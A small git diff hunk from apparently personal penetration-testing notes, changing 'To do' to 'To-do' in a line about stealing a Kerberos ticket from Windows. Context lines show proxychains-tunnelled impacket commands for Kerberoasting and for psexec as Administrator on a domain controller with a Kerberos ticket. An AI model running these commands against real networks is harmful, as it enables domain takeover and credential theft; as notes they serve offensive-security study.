@@ -333,4 +333,4 @@ proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -
 proxychains impacket-psexec Administrator@DC01.CORP1.COM -k -no-pass
 ```
 
-To do - steal keberos ticket from windows, convert to the krb5cc format.
+To-do - steal keberos ticket from windows, convert to the krb5cc format.
